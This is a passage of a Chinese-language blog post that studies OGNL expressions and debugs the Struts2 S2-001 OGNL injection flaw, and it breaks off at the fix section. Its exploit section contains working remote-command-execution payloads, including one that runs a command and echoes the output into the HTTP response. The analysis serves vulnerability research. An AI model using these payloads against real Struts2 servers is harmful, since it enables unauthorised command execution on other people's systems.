<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        AtVisit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AtVisit</span><span class="params">()</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object1</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;@com.Static@ABC&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object2</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;@com.Static@exec(\&quot;calc\&quot;)&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        System.out.println(object1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>静态调用的类代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Static</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ABC</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中调用静态方法时的返回的object2，是基于静态方法的返回值，这里师傅们可以自行修改尝试</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743414846060-1e5b8688-714f-4518-b698-dbd8362f0680.png"></p>
<h5 id="VcMvP">方法的调用</h5>
如果需要调用 Root 对象或者上下文对象当中的方法也可以使用 . 方法的方式来调用。甚至可以传入参数。就和正常的方法调用是一样的，在传参时也可以使用OGNL表达式来传入参数

<p>对应代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        Map&lt;String, Object&gt; context = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        context.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;sean&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;getName()&quot;</span>, context, user)); <span class="comment">// null</span></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;setName(#name)&quot;</span>, context, user);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;getName()&quot;</span>, context, user)); <span class="comment">// sean</span></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;setName(@com.Static@exec(\&quot;calc\&quot;))&quot;</span>, context, user);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;getName()&quot;</span>, context, user)); <span class="comment">// exec</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743415413505-4b044844-1002-440a-8390-99167ac92663.png"></p>
<h5 id="ISv3E">对数组和集合的访问</h5>
OGNL 支持对数组按照数组下标的顺序进行访问。此方式也适用于对集合的访问，对于 Map 支持使用键进行访问

<p>其中可以使用数字的加减，字符的拼接来访问，还有如下一些简单操作</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span> + <span class="number">4</span> <span class="comment">// 整数相加（同时也支持减法、乘法、除法、取余 [% /mod]、）</span></span><br><span class="line"><span class="string">&quot;hell&quot;</span> + <span class="string">&quot;lo&quot;</span> <span class="comment">// 字符串相加</span></span><br><span class="line">i++ <span class="comment">// 递增、递减</span></span><br><span class="line">i == j <span class="comment">// 判断</span></span><br><span class="line"><span class="keyword">var</span> in list <span class="comment">// 是否在容器当中</span></span><br></pre></td></tr></table></figure>

<p>对应代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        Map&lt;String, Object&gt; context = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        String[] strings  = &#123;<span class="string">&quot;aa&quot;</span>, <span class="string">&quot;bb&quot;</span>&#125;;</span><br><span class="line">        ArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">        list.add(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;bb&quot;</span>);</span><br><span class="line">        Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;key2&quot;</span>, <span class="string">&quot;value2&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;list&quot;</span>, list);</span><br><span class="line">        context.put(<span class="string">&quot;strings&quot;</span>, strings);</span><br><span class="line">        context.put(<span class="string">&quot;map&quot;</span>, map);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#strings[0]&quot;</span>, context, user));   <span class="comment">// aa</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list[0]&quot;</span>, context, user));  <span class="comment">// aa</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list[0 + 1]&quot;</span>, context, user));  <span class="comment">// bb</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#map[&#x27;key1&#x27;]&quot;</span>, context, user));  <span class="comment">// value1</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#map[&#x27;key&#x27; + &#x27;2&#x27;]&quot;</span>, context, user));     <span class="comment">// value2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743415917014-5830d2ce-6920-4740-80a9-d81d812c4a34.png"></p>
<h5 id="GRoiG">投影与选择</h5>
OGNL 支持类似数据库当中的选择与投影功能

<ul>
<li><strong>投影：</strong></li>
</ul>
<p>选出集合当中相同属性组合成一个新的集合，语法为<code>collection.&#123;XXX&#125;</code>，其中XXX是该集合中每个元素的公共属性</p>
<ul>
<li><strong>选择：</strong></li>
</ul>
<p>选择就是选出集合中符合条件的元素组合成一个新的集合，语法为<code>collection.&#123;Y XXX&#125;</code>，其中Y是一个选择操作符，XXX是选择用的逻辑表达式</p>
<p>其中选择操作符有三种</p>
<ol>
<li>?：选择满足条件的所有元素</li>
<li>^：选择满足条件的第一个元素</li>
<li>$：选择满足条件的最后一个元素</li>
</ol>
<p>对应代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;name1&quot;</span>, <span class="number">11</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">p2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;name2&quot;</span>, <span class="number">22</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">p3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;name3&quot;</span>, <span class="number">33</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">p4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;name4&quot;</span>, <span class="number">44</span>);</span><br><span class="line">        Map&lt;String, Object&gt; context = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        ArrayList&lt;User&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;User&gt;();</span><br><span class="line">        list.add(p1);</span><br><span class="line">        list.add(p2);</span><br><span class="line">        list.add(p3);</span><br><span class="line">        list.add(p4);</span><br><span class="line">        context.put(<span class="string">&quot;list&quot;</span>, list);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list.&#123;age&#125;&quot;</span>, context, list));</span><br><span class="line"><span class="comment">// [11, 22, 33, 44]</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list.&#123;age + &#x27;-&#x27; + name&#125;&quot;</span>, context, list));</span><br><span class="line"><span class="comment">// [11-name1, 22-name2, 33-name3, 44-name4]</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list.&#123;? #this.age &gt; 22&#125;&quot;</span>, context, list));</span><br><span class="line"><span class="comment">// [User(name=name3, age=33, address=null), User(name=name4, age=44, address=null)]</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list.&#123;^ #this.age &gt; 22&#125;&quot;</span>, context, list));</span><br><span class="line"><span class="comment">// [User(name=name3, age=33, address=null)]</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list.&#123;$ #this.age &gt; 22&#125;&quot;</span>, context, list));</span><br><span class="line"><span class="comment">// [User(name=name4, age=44, address=null)]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743416558563-5643dad0-3c42-4d74-9e17-5ec548c5c1fa.png"></p>
<h5 id="rl2c0">创建对象</h5>
OGNL支持直接使用表达式来创建对象，其中有三种情况

<ul>
<li>List对象：使用<code>&#123;&#125;</code>，中间使用<code>,</code>进行分割</li>
<li>Map对象：使用<code>#&#123;&#125;</code>，中间使用<code>,</code>进行分割键值对</li>
<li>任意对象：直接使用已知对象的构造方法进行构造</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#&#123;&#x27;key1&#x27;:&#x27;value1&#x27;,&#x27;key2&#x27;:&#x27;value2&#x27;&#125;&quot;</span>, <span class="literal">null</span>)); <span class="comment">// &#123;key1=value1&#125;</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;&#123;&#x27;key1&#x27;,&#x27;value1&#x27;&#125;&quot;</span>, <span class="literal">null</span>));  <span class="comment">// [key1, value1]</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;new pojo.User()&quot;</span>, <span class="literal">null</span>));</span><br><span class="line"><span class="comment">// User(name=null, age=0, address=null)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743416950403-6e977822-33e9-4594-a8cb-c28b5ef35528.png"></p>
<p>这里可以直接创建任意对象，感觉就很有攻击面了，可以直接命令执行</p>
<p>代码如下，两者皆可执行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilCalc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> OgnlException &#123;  </span><br><span class="line">        Ognl.getValue(<span class="string">&quot;new java.lang.ProcessBuilder(new java.lang.String[]&#123;\&quot;calc\&quot;&#125;).start()&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line"></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;@java.lang.Runtime@getRuntime().exec(\&quot;calc\&quot;)&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743417080780-c2bdd739-a3ec-4342-9543-3f88616143f1.png"></p>
<h2 id="WwGPD">S2-001</h2>
<h3 id="AHCsG">漏洞影响范围</h3>

<ul>
<li>WebWork 2.1 (with altSyntax enabled)</li>
<li>WebWork 2.2.0 - WebWork 2.2.5</li>
<li>Struts 2.0.0 - Struts 2.0.8</li>
</ul>
<p>而 Struts2 对 OGNL 表达式的解析使用了开源组件 opensymphony.xwork 2.0.3 所以会有漏洞</p>
<h3 id="IItvL">流程分析</h3>

<p>我们这里看到struts的<code>Filter</code>，<code>org.apache.struts2.dispatcher.FilterDispatcher</code>类的<code>doFilter</code>方法</p>
<p>在该方法中，它做了以下业务：</p>
<ul>
<li>设置编码和本地化信息</li>
<li>创建 ActionContext 对象</li>
<li>分配当前线程的分发器</li>
<li>将request对象进行封装</li>
<li>获取 ActionMapping 对象, ActionMapping 对象对应一个action详细配置信息</li>
<li>执行 Action 请求, 也就是 <code>serviceAction()</code>方法</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743486857729-0d588b21-c03e-4a0d-b43d-952c40642242.png"></p>
<p>在<code>doFilter</code>方法中下到断点，前面做了一些基础的数据转换和获取，最后我们跟进<code>serviceAction</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743487680234-4a92ef29-b605-49cb-84de-19414a5e52f5.png"></p>
<p>首先获取当前请求是否已经有<code>ValueStack</code>对象，如果是接收到chain跳转方式的请求时，能够接管上次请求的请求和数据。</p>
<p>如果没有 ValueStack 对象，获取当前线程的ActionContext对象；如果有 ValueStack 对象，将事先处理好的请求中的参数 put 到 ValueStack 中</p>
<p>后续获取 ActionMapping 中配置的 namespace, name, method 值</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743487932957-581b5af6-a0ea-4619-a88e-066b73d942da.png"></p>
<p>这里通过<code>ActionProxyFactory</code>创建了<code>ActionProxy</code>对象，在这个过程中也会创建<code>StrutsActionProxy</code>的实例，<code>StrutsActionProxy</code>是继承自<code>com.opensymphony.xwork2.DefaultActionProxy</code>，实际在该代理对象的内部就持有了<code>DefaultActionInvocation</code>的实例，下一步就为Action代理对象设置执行的方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743489041006-a5d29050-e6d7-4ce2-bc57-10cfc06d65e8.png"></p>
<p>继续跟进到<code>proxy.execute()</code>方法内，可以看到这里获取了上下文，并用setter方法赋值上下文</p>
<p>但这里只是对一些数据进行操作，具体的业务逻辑我们进入invoke方法中查看</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743489792863-b5031d72-c556-4217-bd1c-0c7fa1e34a66.png"></p>
<p>进入<code>invoke</code>方法后，在<code>interceptors.hasNext</code>判断中，使用迭代器进行顺序递归执行配置的所有拦截器，	所迭代的内容是Struts包中<code>default.xml</code>文件内配置的interceptors标签中的内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743490057576-1fbc3552-a31c-47de-b18c-33f7a90d1467.png"></p>
<p>在这么多拦截器中，<code>param</code>是用来处理我们输入的参数的，所有对于OGNL表达式的处理，应该在这个interceptor中，对于该漏洞的本质，其实就是在Struct2中哪个地方进行了OGNL表达式的解析操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743490436216-dd4ce8a9-a7f9-47cd-ab34-960ce5b755e8.png"></p>
<p>在迭代器处理完成后，我们就进入到了<code>invokeActionOnly</code>方法中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493436739-a64e0e71-7abc-434b-923f-96c2cb69fef0.png"></p>
<p>在<code>invokeActionOnly</code>方法中，调用了<code>invokeAction</code>方法，我们走进该方法中调试，发现最后经过反射调用<code>execute</code>方法，开始处理用户的逻辑信息</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">invokeActionOnly</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    	<span class="keyword">return</span> invokeAction(getAction(), proxy.getConfig());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493608672-74519035-a447-4c5c-bd64-6d59829fdabd.png"></p>
<p>处理完用户逻辑后，我们步出该方法，继续向下走，最终跟进<code>executeResult()</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493881368-7491aaf8-0e23-4842-9940-c3f798f57b01.png"></p>
<p>首先用<code>creatResult</code>创建了一个result对象，主要逻辑肯定在<code>execute</code>方法内，继续跟进</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493961354-33f9d879-49a0-43ef-89a6-c18a9327e171.png"></p>
<p>走入<code>execute</code>方法中，继续走进<code>doExecute</code>方法内</p>
<p>在<code>doExecute</code>方法内，准备了发送响应信息，设置了pageContext参数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">this</span>.lastFinalLocation = <span class="built_in">this</span>.conditionalParse(<span class="built_in">this</span>.location, invocation);</span><br><span class="line">        <span class="built_in">this</span>.doExecute(<span class="built_in">this</span>.lastFinalLocation, invocation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doExecute</span><span class="params">(String finalLocation, ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;Forwarding to location &quot;</span> + finalLocation);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">PageContext</span> <span class="variable">pageContext</span> <span class="operator">=</span> ServletActionContext.getPageContext();</span><br><span class="line">        <span class="keyword">if</span> (pageContext != <span class="literal">null</span>) &#123;</span><br><span class="line">            pageContext.include(finalLocation);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ServletActionContext.getRequest();</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ServletActionContext.getResponse();</span><br><span class="line">            <span class="type">RequestDispatcher</span> <span class="variable">dispatcher</span> <span class="operator">=</span> request.getRequestDispatcher(finalLocation);</span><br><span class="line">            <span class="keyword">if</span> (dispatcher == <span class="literal">null</span>) &#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>, <span class="string">&quot;result &#x27;&quot;</span> + finalLocation + <span class="string">&quot;&#x27; not found&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!response.isCommitted() &amp;&amp; request.getAttribute(<span class="string">&quot;javax.servlet.include.servlet_path&quot;</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">                request.setAttribute(<span class="string">&quot;struts.view_uri&quot;</span>, finalLocation);</span><br><span class="line">                request.setAttribute(<span class="string">&quot;struts.request_uri&quot;</span>, request.getRequestURI());</span><br><span class="line">                dispatcher.forward(request, response);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dispatcher.include(request, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>之后会调用<code>JspServlet</code>来处理请求，解析标签时，在标签的开始和结束位置，分别调用对应实现类如<code>org.apache.struts2.views.jsp.ComponentTagSupport</code>中的 <code>doStartTag()</code>（一些初始化操作) 及 <code>doEndTag() </code>（标签解析后调用end方法)方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">doEndTag</span><span class="params">()</span> <span class="keyword">throws</span> JspException &#123;</span><br><span class="line">        <span class="built_in">this</span>.component.end(<span class="built_in">this</span>.pageContext.getOut(), <span class="built_in">this</span>.getBody());</span><br><span class="line">        <span class="built_in">this</span>.component = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">end</span><span class="params">(Writer writer, String body)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.evaluateParams();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.end(writer, body, <span class="literal">false</span>);</span><br><span class="line">            <span class="built_in">this</span>.mergeTemplate(writer, <span class="built_in">this</span>.buildTemplateName(<span class="built_in">this</span>.template, <span class="built_in">this</span>.getDefaultTemplate()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            <span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> var7;</span><br><span class="line">            LOG.error(<span class="string">&quot;error when rendering&quot;</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.popComponentStack();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>evaluateParams</code>方法，在该if判断中，因为altSyntax默认开启，所以走入if判断中</p>
<p>将username拼接进<code>%&#123;&#125;</code>中，这里本意是想使用<code>%&#123;username&#125;</code>来获取域中的username参数，但是由于存在循环解析，使用造成了OGNL注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743495014666-0641ba73-a64c-4874-abbf-6a557cf9ec4a.png"></p>
<p>我们继续看到<code>findValue</code>方法中，进行寻找值的操作，并继续走入<code>translateVariables</code>方法</p>
<p>在这里，会将拼接好的<code>%&#123;username&#125;</code>中的<code>%&#123;</code>和<code>&#125;</code>截取，只剩下username</p>
<p>然后使用findValue方法，将我们所输入的username查找出来并赋值给o，也就是我们输入的<code>%&#123;10*10&#125;</code>，然后进行新的一次循环，将我们输入的东西再次当成OGNL表达式解析，就造成了此漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743495489057-a8ca10ec-e472-4358-9100-90c800e3e5d8.png"></p>
<h3 id="RyS8z">漏洞利用</h3>
漏洞利用基于上述的OGNL表达式

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)).start()&#125;</span><br><span class="line"></span><br><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;clac&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743474566019-267cfed1-1471-4458-b677-6f238a1af9bf.png"></p>
<h3 id="lc9Hh">漏洞修复</h3>
通过漏洞分析可以看到，是由于 struts2 错误的使用了递归循环来进行OGNL表达式的解析，所导致的OGNL表达式的执行

<p>官方修复如下</p>
